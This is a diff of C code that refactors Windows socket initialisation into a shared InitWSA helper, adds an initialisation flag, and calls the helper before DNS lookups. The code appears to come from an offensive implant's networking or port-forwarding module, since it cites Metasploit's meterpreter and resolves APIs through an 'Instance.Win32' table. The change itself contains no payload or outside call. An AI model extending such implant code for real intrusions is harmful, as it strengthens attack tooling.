@@ -26,15 +26,38 @@ DWORD RecvAll( SOCKET Socket, PVOID Buffer, DWORD Length )
     return tret;
 }
 
+BOOL InitWSA( VOID )
+{
+    WSADATA WsData = { 0 };
+    DWORD   Result = 0;
+
+    /* Init Windows Socket. */
+    if ( Instance.WSAWasInitialised == FALSE )
+    {
+        PUTS( "Init Windows Socket..." )
+
+        if ( ( Result = Instance.Win32.WSAStartup( MAKEWORD( 2, 2 ), &WsData ) ) != 0 )
+        {
+            PRINTF( "WSAStartup Failed: %d\n", Result )
+
+            /* cleanup and be gone. */
+            Instance.Win32.WSACleanup();
+            return FALSE;
+        }
+
+        Instance.WSAWasInitialised = TRUE;
+    }
+
+    return TRUE;
+}
+
 /* Inspired from https://github.com/rapid7/metasploit-payloads/blob/master/c/meterpreter/source/extensions/stdapi/server/net/socket/tcp_server.c#L277 */
 PSOCKET_DATA SocketNew( SOCKET WinSock, DWORD Type, DWORD IPv4, PBYTE IPv6, DWORD LclPort, DWORD FwdAddr, DWORD FwdPort )
 {
     PSOCKET_DATA    Socket    = NULL;
     SOCKADDR_IN     SockAddr  = { 0 };
     SOCKADDR_IN6_LH SockAddr6 = { 0 };
-    WSADATA         WsData    = { 0 };
     BOOL            IoBlock   = TRUE;
-    DWORD           Result    = 0;
 
     if ( ! IPv4 && ! IPv6 )
     {
@@ -48,17 +71,8 @@ PSOCKET_DATA SocketNew( SOCKET WinSock, DWORD Type, DWORD IPv4, PBYTE IPv6, DWOR
      * the caller only wants an object inserted into the socket linked list. */
     if ( ( Type != SOCKET_TYPE_NONE ) && ( Type != SOCKET_TYPE_CLIENT ) )
     {
-        PUTS( "Init Windows Socket..." )
-
-        /* Init Windows Socket. */
-        if ( ( Result = Instance.Win32.WSAStartup( MAKEWORD( 2, 2 ), &WsData ) ) != 0 )
-        {
-            PRINTF( "WSAStartup Failed: %d\n", Result )
-
-            /* cleanup and be gone. */
-            Instance.Win32.WSACleanup();
+        if ( ! InitWSA() )
             return NULL;
-        }
 
         PUTS( "Create Socket..." )
 
@@ -188,6 +202,7 @@ CLEANUP:
     if ( WinSock && WinSock != INVALID_SOCKET )
         Instance.Win32.closesocket( WinSock );
     Instance.Win32.WSACleanup();
+    Instance.WSAWasInitialised = FALSE;
 
     return NULL;
 }
@@ -443,6 +458,9 @@ DWORD DnsQueryIPv4( LPSTR Domain )
     DWORD       IP        = 0;
     INT         Ret       = 0;
 
+    if ( ! InitWSA() )
+        return 0;
+
     hints.ai_family   = AF_INET;
     hints.ai_socktype = SOCK_STREAM;
     hints.ai_protocol = IPPROTO_TCP;
@@ -481,6 +499,9 @@ PBYTE DnsQueryIPv6( LPSTR Domain )
     DWORD       IP        = 0;
     INT         Ret       = 0;
     PBYTE       IPv6      = NULL;
+
+    if ( ! InitWSA() )
+        return 0;
 
     hints.ai_family   = AF_INET6;
     hints.ai_socktype = SOCK_STREAM;
